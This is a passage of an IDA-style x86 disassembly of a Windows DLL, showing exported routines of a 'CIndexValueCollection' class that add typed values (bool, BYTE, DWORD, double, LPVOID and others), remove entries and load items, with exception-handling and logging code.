		lea	ecx, [ebp+arg_0]
		call	sub_6AF33353
		push	eax
		mov	ecx, esi
		call	sub_6AF33B50
		jmp	short loc_6AF33F0E
; ---------------------------------------------------------------------------

loc_6AF33F33:				; CODE XREF: sub_6AF33E8C+90j
					; sub_6AF33E8C+C9j
		test	ebx, ebx
		mov	eax, [esi+0Ch]
		jbe	short loc_6AF33F57
		mov	[ebp+arg_4], eax
		lea	eax, [edi-1]
		push	eax
		lea	ecx, [ebp+arg_0]
		mov	[ebp+arg_0], esi
		call	sub_6AF3351E
		push	eax
		mov	ecx, esi
		call	sub_6AF33B50
		dec	ebx
		jmp	short loc_6AF33F33
; ---------------------------------------------------------------------------

loc_6AF33F57:				; CODE XREF: sub_6AF33E8C+ACj
		add	eax, edi
		push	eax
		push	esi
		push	[ebp+arg_14]
		push	[ebp+arg_10]
		push	[ebp+var_28]

loc_6AF33F64:				; CODE XREF: sub_6AF33E8C+1D6j
		push	[ebp+arg_8]
		lea	eax, [ebp+arg_8]
		push	eax
		call	sub_6AF338C3
		add	esp, 1Ch
		jmp	loc_6AF340F5
; ---------------------------------------------------------------------------

loc_6AF33F78:				; CODE XREF: sub_6AF33E8C+6Bj
		mov	[ebp+arg_4], edi

loc_6AF33F7B:				; CODE XREF: sub_6AF33E8C+115j
		cmp	[ebp+arg_4], 0
		mov	eax, [esi+0Ch]
		jbe	short loc_6AF33FBC
		mov	[ebp+var_18], eax
		lea	eax, [edi-1]
		push	eax
		lea	ecx, [ebp+var_1C]
		mov	[ebp+var_1C], esi
		call	sub_6AF3351E
		push	eax
		mov	ecx, esi
		call	sub_6AF33B50
		dec	[ebp+arg_4]
		jmp	short loc_6AF33F7B
; ---------------------------------------------------------------------------

loc_6AF33FA3:				; DATA XREF: .rdata:stru_6AF621F4o
		mov	esi, [ebp+var_20]
		mov	edi, [ebp+var_24]
		jmp	short loc_6AF33FB2
; ---------------------------------------------------------------------------

loc_6AF33FAB:				; CODE XREF: sub_6AF33E8C+129j
		mov	ecx, esi
		call	sub_6AF337AB

loc_6AF33FB2:				; CODE XREF: sub_6AF33E8C+11Dj
		cmp	edi, [esi+10h]
		jb	short loc_6AF33FAB
		jmp	loc_6AF340AD
; ---------------------------------------------------------------------------

loc_6AF33FBC:				; CODE XREF: sub_6AF33E8C+F6j
		add	eax, edi
		push	eax
		mov	ecx, eax
		push	esi
		add	ecx, ebx
		push	ecx
		mov	edx, eax
		push	esi
		add	edx, edi
		push	edx
		lea	eax, [ebp+arg_0]
		push	esi
		push	eax
		mov	[ebp+arg_0], esi
		mov	[ebp+var_2C], esi
		call	sub_6AF338C3
		mov	eax, [esi+0Ch]
		add	eax, ebx
		push	eax
		push	esi
		jmp	loc_6AF340DD
; ---------------------------------------------------------------------------

loc_6AF33FE7:				; CODE XREF: sub_6AF33E8C+5Cj
		cmp	edi, [ebp+var_14]
		mov	[ebp+var_4], 2
		jnb	short loc_6AF34067
		mov	ecx, [ebp+arg_C]
		mov	eax, [ebp+arg_8]
		add	ecx, edi
		mov	[ebp+var_28], ecx
		mov	[ebp+arg_0], eax
		mov	[ebp+arg_4], ecx

loc_6AF34004:				; CODE XREF: sub_6AF33E8C+19Bj
		lea	eax, [ebp+arg_10]
		push	eax
		lea	ecx, [ebp+arg_0]
		call	sub_6AF333C8
		test	al, al
		jnz	short loc_6AF34029
		lea	ecx, [ebp+arg_0]
		call	sub_6AF33353
		push	eax
		mov	ecx, esi
		call	sub_6AF33BCE
		inc	[ebp+arg_4]
		jmp	short loc_6AF34004
; ---------------------------------------------------------------------------

loc_6AF34029:				; CODE XREF: sub_6AF33E8C+186j
		and	[ebp+arg_4], 0

loc_6AF3402D:				; CODE XREF: sub_6AF33E8C+1C7j
		mov	ecx, [ebp+arg_4]
		cmp	ecx, edi
		mov	eax, [esi+0Ch]
		jnb	short loc_6AF34055
		add	ecx, ebx
		push	ecx
		lea	ecx, [ebp+arg_10]
		mov	[ebp+arg_10], esi
		mov	[ebp+arg_14], eax
		call	sub_6AF3351E
		push	eax
		mov	ecx, esi
		call	sub_6AF33BCE
		inc	[ebp+arg_4]
		jmp	short loc_6AF3402D
; ---------------------------------------------------------------------------

loc_6AF34055:				; CODE XREF: sub_6AF33E8C+1A9j
		add	eax, ebx
		push	eax
		push	esi
		push	[ebp+var_28]
		push	[ebp+arg_8]
		push	[ebp+arg_C]
		jmp	loc_6AF33F64
; ---------------------------------------------------------------------------

loc_6AF34067:				; CODE XREF: sub_6AF33E8C+165j
		and	[ebp+arg_4], 0

loc_6AF3406B:				; CODE XREF: sub_6AF33E8C+20Bj
		mov	ecx, [ebp+arg_4]
		cmp	ecx, [ebp+var_14]
		mov	eax, [esi+0Ch]
		jnb	short loc_6AF340B6
		sub	ecx, [ebp+var_14]
		mov	[ebp+var_2C], esi
		add	ecx, edi
		add	ecx, ebx
		push	ecx
		lea	ecx, [ebp+var_2C]
		mov	[ebp+var_28], eax
		call	sub_6AF3351E
		push	eax
		mov	ecx, esi
		call	sub_6AF33BCE
		inc	[ebp+arg_4]
		jmp	short loc_6AF3406B
; ---------------------------------------------------------------------------

loc_6AF34099:				; DATA XREF: .rdata:stru_6AF62204o
		mov	esi, [ebp+var_20]
		mov	edi, [ebp+var_24]
		jmp	short loc_6AF340A8
; ---------------------------------------------------------------------------

loc_6AF340A1:				; CODE XREF: sub_6AF33E8C+21Fj
		mov	ecx, esi
		call	sub_6AF337DD

loc_6AF340A8:				; CODE XREF: sub_6AF33E8C+213j
		cmp	edi, [esi+10h]
		jb	short loc_6AF340A1

loc_6AF340AD:				; CODE XREF: sub_6AF33E8C+12Bj
		push	0
		push	0
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF340B6:				; CODE XREF: sub_6AF33E8C+1E8j
		mov	ebx, esi
		mov	esi, eax
		add	esi, [ebp+var_18]
		mov	edx, ebx
		mov	eax, esi
		add	eax, edi
		push	eax
		mov	ecx, esi
		add	ecx, edi
		sub	ecx, [ebp+var_14]
		push	edx
		push	ecx
		mov	edi, ebx
		push	edi
		push	esi
		lea	eax, [ebp+arg_0]
		push	ebx
		push	eax
		call	sub_6AF3389B
		push	esi
		push	ebx

loc_6AF340DD:				; CODE XREF: sub_6AF33E8C+156j
		push	[ebp+arg_14]
		lea	eax, [ebp+arg_8]
		push	[ebp+arg_10]
		push	[ebp+arg_C]
		push	[ebp+arg_8]
		push	eax
		call	sub_6AF338C3
		add	esp, 38h

loc_6AF340F5:				; CODE XREF: sub_6AF33E8C+E7j
		mov	ecx, [ebp+var_C]
		pop	edi
		pop	esi
		mov	large fs:0, ecx
		pop	ebx
		leave
		retn	1Ch
sub_6AF33E8C	endp

; Exported entry 156.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal156
Ordinal156	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal256
		lea	eax, [esi+78h]
		mov	dword ptr [esi], offset	off_6AF54D14
		xor	ecx, ecx
		mov	[eax+4], ecx
		mov	[eax+8], ecx
		mov	[eax+0Ch], ecx
		mov	[eax+10h], ecx
		mov	eax, esi
		pop	esi
		retn
Ordinal156	endp

; Exported entry 161.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal161
Ordinal161	proc near		; DATA XREF: .rdata:off_6AF66098o

var_14		= byte ptr -14h
var_8		= byte ptr -8
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		push	ebx
		push	esi
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_14]
		call	Ordinal1228
		mov	edx, [ebp+arg_0]
		cmp	edx, [esi+88h]
		jb	short loc_6AF3415C
		push	offset aCindexvaluec_5 ; "CIndexValueCollection::Remove() : dwInd"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF34175
; ---------------------------------------------------------------------------

loc_6AF3415C:				; CODE XREF: Ordinal161+24j
		lea	ecx, [esi+78h]
		mov	eax, [ecx+0Ch]
		add	eax, edx
		push	eax
		push	ecx
		lea	eax, [ebp+var_8]
		push	eax
		call	sub_6AF33C28
		mov	byte ptr [esi+8], 1
		mov	bl, 1

loc_6AF34175:				; CODE XREF: Ordinal161+31j
		lea	ecx, [ebp+var_14]
		call	Ordinal1230
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	4
Ordinal161	endp

; Exported entry 162.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal162
Ordinal162	proc near		; CODE XREF: Ordinal157+9p
					; Ordinal163+36p ...

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		lea	ecx, [esi+78h]
		call	sub_6AF33B0C
		lea	ecx, [ebp+var_C]
		mov	byte ptr [esi+8], 1
		call	Ordinal1230
		mov	al, 1
		pop	esi
		leave
		retn
Ordinal162	endp

; Exported entry 180.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal180
Ordinal180	proc near		; CODE XREF: Ordinal164+24p
					; Ordinal165+24p ...

var_98		= byte ptr -98h
var_50		= dword	ptr -50h
var_4C		= dword	ptr -4Ch
var_48		= byte ptr -48h
var_28		= dword	ptr -28h
Src		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		mov	eax, offset unknown_libname_32 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 8Ch
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	esi, ecx
		mov	[ebp+var_10], esp
		push	offset aCindexvaluec_6 ; "CIndexValueCollection::Load()"
		lea	ecx, [ebp+var_48]
		mov	[ebp+var_14], eax
		mov	[ebp+var_28], esi
		call	Ordinal751
		and	[ebp+var_4], 0
		lea	ecx, [ebp+var_98]
		call	Ordinal245
		lea	eax, [ebp+var_98]
		push	eax
		lea	ecx, [esi+78h]
		mov	byte ptr [ebp+var_4], 2
		call	sub_6AF33BCE
		lea	ecx, [ebp+var_98]
		call	Ordinal246
		jmp	loc_6AF342B4
; ---------------------------------------------------------------------------

loc_6AF34219:				; DATA XREF: .rdata:6AF62284o
		push	13h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	ecx, [ebp+var_50]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF342B1
		retn
; ---------------------------------------------------------------------------

loc_6AF3425C:				; DATA XREF: .rdata:6AF62294o
		push	15h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	eax, [ebp+var_4C]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF342B1
		retn
; ---------------------------------------------------------------------------

loc_6AF342B1:				; DATA XREF: Ordinal180+9Fo
					; Ordinal180+F4o
		mov	esi, [ebp+var_28]

loc_6AF342B4:				; CODE XREF: Ordinal180+5Dj
		xor	ebx, ebx
		lea	ecx, [ebp+var_48]
		mov	[ebp+var_4], ebx
		call	Ordinal753
		test	eax, eax
		jnz	short loc_6AF342ED
		mov	eax, [esi+88h]
		dec	eax
		push	eax
		lea	ecx, [esi+78h]
		call	sub_6AF33782
		mov	edi, [ebp+arg_0]
		mov	ecx, eax
		mov	[edi], eax
		call	Ordinal250
		mov	eax, [edi]
		mov	byte ptr [eax+44h], 1
		mov	byte ptr [esi+8], 1
		mov	bl, 1

loc_6AF342ED:				; CODE XREF: Ordinal180+10Cj
		lea	ecx, [ebp+var_48]
		call	Ordinal752
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		mov	al, bl
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	4
Ordinal180	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF34310	proc near		; CODE XREF: sub_6AF348C4+19p

var_14		= byte ptr -14h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= byte ptr  0Ch

		mov	eax, offset unknown_libname_33 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		push	ecx
		push	ecx
		push	esi
		mov	esi, [ecx+10h]
		mov	edx, [ebp+arg_0]
		and	[ebp+var_4], 0
		cmp	edx, esi
		jbe	short loc_6AF34342
		mov	eax, [ecx+0Ch]
		push	edi
		lea	edi, [ebp+arg_4]
		push	edi
		sub	edx, esi
		push	edx
		add	eax, esi
		push	eax
		push	ecx
		call	sub_6AF33C47
		pop	edi
		jmp	short loc_6AF34358
; ---------------------------------------------------------------------------

loc_6AF34342:				; CODE XREF: sub_6AF34310+19j
		jnb	short loc_6AF34358
		mov	eax, [ecx+0Ch]
		add	esi, eax
		push	esi
		push	ecx
		add	eax, edx
		push	eax
		push	ecx
		lea	eax, [ebp+var_14]
		push	eax
		call	sub_6AF33968

loc_6AF34358:				; CODE XREF: sub_6AF34310+30j
					; sub_6AF34310:loc_6AF34342j
		lea	ecx, [ebp+arg_4]
		call	Ordinal246
		mov	ecx, [ebp+var_C]
		pop	esi
		mov	large fs:0, ecx
		leave
		retn	4Ch
sub_6AF34310	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_6AF3436F(void *Src,	int)
sub_6AF3436F	proc near		; CODE XREF: sub_6AF348E7+1Cp
					; sub_6AF38282+41p

Src		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		cmp	[ebp+arg_4], 0
		push	ebx
		mov	ebx, ecx
		jnz	short loc_6AF34382
		call	sub_6AF33810
		jmp	short loc_6AF343D3
; ---------------------------------------------------------------------------

loc_6AF34382:				; CODE XREF: sub_6AF3436F+Aj
		push	esi
		mov	esi, [ebp+Src]
		test	esi, esi
		jnz	short loc_6AF34394
		push	80070057h
		call	sub_6AF3110D
; ---------------------------------------------------------------------------

loc_6AF34394:				; CODE XREF: sub_6AF3436F+19j
		mov	eax, [ebx]
		push	edi
		push	[ebp+arg_4]
		mov	edi, [eax-0Ch]
		sub	esi, eax
		mov	ecx, ebx
		sar	esi, 1
		call	sub_6AF33BA4
		cmp	esi, edi
		pop	edi
		push	[ebp+arg_4]	; int
		ja	short loc_6AF343BC
		lea	ecx, [eax+esi*2]
		push	ecx		; Src
		push	eax		; Dst
		call	sub_6AF3343D
		jmp	short loc_6AF343C5
; ---------------------------------------------------------------------------

loc_6AF343BC:				; CODE XREF: sub_6AF3436F+3Fj
		push	[ebp+Src]	; Src
		push	eax		; Dst
		call	sub_6AF33425

loc_6AF343C5:				; CODE XREF: sub_6AF3436F+4Bj
		add	esp, 0Ch
		push	[ebp+arg_4]
		mov	ecx, ebx
		call	sub_6AF33456
		pop	esi

loc_6AF343D3:				; CODE XREF: sub_6AF3436F+11j
		pop	ebx
		pop	ebp
		retn	8
sub_6AF3436F	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF343D8	proc near		; CODE XREF: sub_6AF34825+91p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch

		push	ebp
		mov	ebp, esp
		push	[ebp+arg_14]
		push	[ebp+arg_14]
		push	[ebp+arg_10]
		push	[ebp+arg_C]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	sub_6AF33E8C
		pop	ebp
		retn	18h
sub_6AF343D8	endp

; Exported entry 157.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal157
Ordinal157	proc near		; CODE XREF: sub_6AF3490D+3p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF54D14
		call	Ordinal162
		lea	ecx, [esi+78h]
		call	sub_6AF33B0C
		mov	ecx, esi
		pop	esi
		jmp	Ordinal257
Ordinal157	endp

; Exported entry 164.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal164
Ordinal164	proc near		; DATA XREF: .rdata:off_6AF66098o

var_10		= byte ptr -10h
var_4		= dword	ptr -4
arg_0		= byte ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	ebx
		push	esi
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_10]
		call	Ordinal1228
		lea	eax, [ebp+var_4]
		push	eax
		mov	ecx, esi
		mov	[ebp+var_4], ebx
		call	Ordinal180
		test	al, al
		jnz	short loc_6AF34451
		push	offset aCindexvaluec_7 ; "CIndexValueCollection::AddValue(bool)	:"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF34463
; ---------------------------------------------------------------------------

loc_6AF34451:				; CODE XREF: Ordinal164+2Bj
		mov	eax, [ebp+var_4]
		mov	cl, [ebp+arg_0]
		mov	dword ptr [eax+8], 0Ah
		mov	[eax+10h], cl
		mov	bl, 1

loc_6AF34463:				; CODE XREF: Ordinal164+38j
		lea	ecx, [ebp+var_10]
		call	Ordinal1230
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	4
Ordinal164	endp

; Exported entry 165.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal165
Ordinal165	proc near		; DATA XREF: .rdata:off_6AF66098o

var_10		= byte ptr -10h
var_4		= dword	ptr -4
arg_0		= byte ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	ebx
		push	esi
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_10]
		call	Ordinal1228
		lea	eax, [ebp+var_4]
		push	eax
		mov	ecx, esi
		mov	[ebp+var_4], ebx
		call	Ordinal180
		test	al, al
		jnz	short loc_6AF344AD
		push	offset aCindexvaluec_8 ; "CIndexValueCollection::AddValue(BYTE)	:"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF344BC
; ---------------------------------------------------------------------------

loc_6AF344AD:				; CODE XREF: Ordinal165+2Bj
		mov	eax, [ebp+var_4]
		mov	cl, [ebp+arg_0]
		xor	ebx, ebx
		inc	ebx
		mov	[eax+8], ebx
		mov	[eax+10h], cl

loc_6AF344BC:				; CODE XREF: Ordinal165+38j
		lea	ecx, [ebp+var_10]
		call	Ordinal1230
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	4
Ordinal165	endp

; Exported entry 166.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal166
Ordinal166	proc near		; DATA XREF: .rdata:off_6AF66098o

var_10		= byte ptr -10h
var_4		= dword	ptr -4
arg_0		= word ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	ebx
		push	esi
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_10]
		call	Ordinal1228
		lea	eax, [ebp+var_4]
		push	eax
		mov	ecx, esi
		mov	[ebp+var_4], ebx
		call	Ordinal180
		test	al, al
		jnz	short loc_6AF34506
		push	offset aCindexvaluec_9 ; "CIndexValueCollection::AddValue(WORD)	:"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF3451A
; ---------------------------------------------------------------------------

loc_6AF34506:				; CODE XREF: Ordinal166+2Bj
		mov	eax, [ebp+var_4]
		mov	cx, [ebp+arg_0]
		mov	dword ptr [eax+8], 2
		mov	[eax+10h], cx
		mov	bl, 1

loc_6AF3451A:				; CODE XREF: Ordinal166+38j
		lea	ecx, [ebp+var_10]
		call	Ordinal1230
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	4
Ordinal166	endp

; Exported entry 167.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal167
Ordinal167	proc near		; DATA XREF: .rdata:off_6AF66098o

var_10		= byte ptr -10h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	ebx
		push	esi
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_10]
		call	Ordinal1228
		lea	eax, [ebp+var_4]
		push	eax
		mov	ecx, esi
		mov	[ebp+var_4], ebx
		call	Ordinal180
		test	al, al
		jnz	short loc_6AF34564
		push	offset aCindexvalue_10 ; "CIndexValueCollection::AddValue(DWORD) "...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF34576
; ---------------------------------------------------------------------------

loc_6AF34564:				; CODE XREF: Ordinal167+2Bj
		mov	eax, [ebp+var_4]
		mov	ecx, [ebp+arg_0]
		mov	dword ptr [eax+8], 3
		mov	[eax+10h], ecx
		mov	bl, 1

loc_6AF34576:				; CODE XREF: Ordinal167+38j
		lea	ecx, [ebp+var_10]
		call	Ordinal1230
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	4
Ordinal167	endp

; Exported entry 168.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal168
Ordinal168	proc near		; DATA XREF: .rdata:off_6AF66098o

var_10		= byte ptr -10h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	ebx
		push	esi
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_10]
		call	Ordinal1228
		lea	eax, [ebp+var_4]
		push	eax
		mov	ecx, esi
		mov	[ebp+var_4], ebx
		call	Ordinal180
		test	al, al
		jnz	short loc_6AF345C0
		push	offset aCindexvalue_11 ; "CIndexValueCollection::AddValue(ULONGLO"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF345D8
; ---------------------------------------------------------------------------

loc_6AF345C0:				; CODE XREF: Ordinal168+2Bj
		mov	eax, [ebp+var_4]
		mov	ecx, [ebp+arg_0]
		mov	dword ptr [eax+8], 4
		mov	[eax+10h], ecx
		mov	ecx, [ebp+arg_4]
		mov	[eax+14h], ecx
		mov	bl, 1

loc_6AF345D8:				; CODE XREF: Ordinal168+38j
		lea	ecx, [ebp+var_10]
		call	Ordinal1230
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	8
Ordinal168	endp

; Exported entry 169.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal169(double)
		public Ordinal169
Ordinal169	proc near		; DATA XREF: .rdata:off_6AF66098o

var_10		= byte ptr -10h
var_4		= dword	ptr -4
arg_0		= qword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	ebx
		push	esi
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_10]
		call	Ordinal1228
		lea	eax, [ebp+var_4]
		push	eax
		mov	ecx, esi
		mov	[ebp+var_4], ebx
		call	Ordinal180
		test	al, al
		jnz	short loc_6AF34622
		push	offset aCindexvalue_12 ; "CIndexValueCollection::AddValue(double)"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF34634
; ---------------------------------------------------------------------------

loc_6AF34622:				; CODE XREF: Ordinal169+2Bj
		mov	eax, [ebp+var_4]
		fld	[ebp+arg_0]
		mov	dword ptr [eax+8], 5
		fstp	qword ptr [eax+10h]
		mov	bl, 1

loc_6AF34634:				; CODE XREF: Ordinal169+38j
		lea	ecx, [ebp+var_10]
		call	Ordinal1230
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	8
Ordinal169	endp

; Exported entry 170.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal170
Ordinal170	proc near		; DATA XREF: .rdata:off_6AF66098o

var_10		= byte ptr -10h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	ebx
		push	esi
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_10]
		call	Ordinal1228
		lea	eax, [ebp+var_4]
		push	eax
		mov	ecx, esi
		mov	[ebp+var_4], ebx
		call	Ordinal180
		test	al, al
		jnz	short loc_6AF3467E
		push	offset aCindexvalue_13 ; "CIndexValueCollection::AddValue(long)	:"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF34690
; ---------------------------------------------------------------------------

loc_6AF3467E:				; CODE XREF: Ordinal170+2Bj
		mov	eax, [ebp+var_4]
		mov	ecx, [ebp+arg_0]
		mov	dword ptr [eax+8], 6
		mov	[eax+10h], ecx
		mov	bl, 1

loc_6AF34690:				; CODE XREF: Ordinal170+38j
		lea	ecx, [ebp+var_10]
		call	Ordinal1230
		pop	esi
		mov	al, bl
		pop	ebx
		leave
		retn	4
Ordinal170	endp

; Exported entry 171.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal171(void	*Src, size_t Args)
		public Ordinal171
Ordinal171	proc near		; DATA XREF: .rdata:off_6AF66098o

var_10		= byte ptr -10h
var_4		= dword	ptr -4
Src		= dword	ptr  8
Args		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	ebx
		xor	ebx, ebx
		cmp	[ebp+Src], ebx
		push	esi
		mov	esi, ecx
		jnz	short loc_6AF346E4
		cmp	[ebp+Args], ebx
		ja	short loc_6AF346E9

loc_6AF346B6:				; CODE XREF: Ordinal171+47j
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_10]
		call	Ordinal1228
		lea	eax, [ebp+var_4]
		push	eax
		mov	ecx, esi
		mov	[ebp+var_4], ebx
		call	Ordinal180
		test	al, al
		jnz	short loc_6AF346F8
		push	offset aCindexvalue_13 ; "CIndexValueCollection::AddValue(long)	:"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF3473F
; ---------------------------------------------------------------------------

loc_6AF346E4:				; CODE XREF: Ordinal171+Fj
		cmp	[ebp+Args], ebx
		jnz	short loc_6AF346B6

loc_6AF346E9:				; CODE XREF: Ordinal171+14j
		push	offset aCindexvalue_14 ; "CIndexValueCollection::AddValue(LPVOID)"...
		call	sub_6AF3102E
		pop	ecx
		xor	al, al
		jmp	short loc_6AF34749
; ---------------------------------------------------------------------------

loc_6AF346F8:				; CODE XREF: Ordinal171+35j
		cmp	[ebp+Args], ebx
		push	edi
		mov	edi, [ebp+var_4]
		jbe	short loc_6AF34735
		push	[ebp+Args]	; Args
		lea	esi, [edi+28h]
		mov	ecx, esi
		call	Ordinal870
		test	eax, eax
		jnz	short loc_6AF3471F
		push	offset aCindexvalue_15 ; "CIndexValueCollection::AddValue(LPVOID)"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF3473E
; ---------------------------------------------------------------------------

loc_6AF3471F:				; CODE XREF: Ordinal171+70j
		push	[ebp+Args]	; Size
		mov	ecx, esi
		push	[ebp+Src]	; Src
		call	Ordinal865
		push	eax		; Dst
		call	memcpy
		add	esp, 0Ch

loc_6AF34735:				; CODE XREF: Ordinal171+5Fj
		mov	dword ptr [edi+8], 9
		mov	bl, 1

loc_6AF3473E:				; CODE XREF: Ordinal171+7Dj
		pop	edi

loc_6AF3473F:				; CODE XREF: Ordinal171+42j
		lea	ecx, [ebp+var_10]
		call	Ordinal1230
		mov	al, bl

loc_6AF34749:				; CODE XREF: Ordinal171+56j
		pop	esi
		pop	ebx
		leave
		retn	8
Ordinal171	endp ; sp-analysis failed

; Exported entry 174.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal174(VARIANTARG *pvargSrc)
		public Ordinal174
Ordinal174	proc near		; DATA XREF: .rdata:off_6AF66098o

var_10		= byte ptr -10h
var_4		= dword	ptr -4
pvargSrc	= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	ebx
		push	esi
		mov	esi, ecx
		xor	ebx, ebx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [esi+58h]
		push	eax
		lea	ecx, [ebp+var_10]
		call	Ordinal1228
		lea	eax, [ebp+var_4]
		push	eax
